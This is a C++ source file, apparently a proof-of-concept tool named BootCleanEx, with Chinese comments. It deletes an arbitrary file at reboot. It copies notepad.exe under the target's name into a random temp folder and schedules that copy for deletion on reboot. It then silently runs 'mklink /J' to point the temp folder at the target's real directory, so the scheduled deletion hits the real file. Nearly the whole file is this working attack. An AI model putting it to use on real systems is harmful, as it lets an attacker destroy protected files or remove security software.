// @AUTHOR: y11en
// BootCleanEx.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <string>
#include <Windows.h>

std::string RandStr(int len)
{
    std::string str;
    for (int i = 0; i < len; ++i)
    {
        str += (char)('a' + rand() % 26);
    }
    return str;
}

void BootCleanEx( std::string targetPath)
{
    
    char buff[MAX_PATH + 1] = { 0 };
    std::string fake;
    std::string fakedir;
       

    size_t pos = targetPath.rfind("\\");
    std::string name = targetPath.substr(pos + 1);
    std::string reladir = targetPath.substr(0, pos);


    printf("name=%s dir=%s\n", name.c_str(), reladir.c_str());

    // 1. 随便搞个临时目录凑合一下
    GetTempPathA(MAX_PATH, buff);
    fake = buff;
    CreateDirectoryA(fake.c_str(), NULL);
    fake.append("\\");
    fake.append(RandStr(8));
    fakedir = fake;

    // 2. 随便凑个文件，whatever
    fake.append("\\");
    fake.append(name);
    CopyFileA(R"(C:\Windows\notepad.exe)", fake.c_str(), FALSE);


    // 3. 我抓周树人和你鲁迅有啥关系？
    bool bret = MoveFileExA(fake.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    printf("BOOT_MOVE = %s lasterr=%d\n", bret?"成功了":"失败了", GetLastError());

    
    // 4. 回首掏
    std::string cmdline = R"(cmd.exe /c mklink /J "__FAKE_DIR__" "__REAL_DIR__")";

    std::string strA = "__FAKE_DIR__";
    std::string strB = "__REAL_DIR__";

    cmdline = cmdline.replace(cmdline.find(strA), strA.length(), fakedir);
    cmdline = cmdline.replace(cmdline.find(strB), strB.length(), reladir);

    printf("%s", cmdline.c_str());
    WinExec(cmdline.c_str(), SW_HIDE);

}

int main(int argc, const char* argv[])
{
    srand(time(0) + 1337);

    if (argc == 2)
    {
        const char* path = argv[1];

        if (-1 != GetFileAttributesA(path))
        {
            BootCleanEx(path);
        }
        else
        {
            printf("%s not exists.\n", path);
        }
    }
    else
    {
        printf("USAGE:\n\t%s %%WHATEVER_PATH%% \n", argv[0]);
    }

    getchar();
    return 0;
}

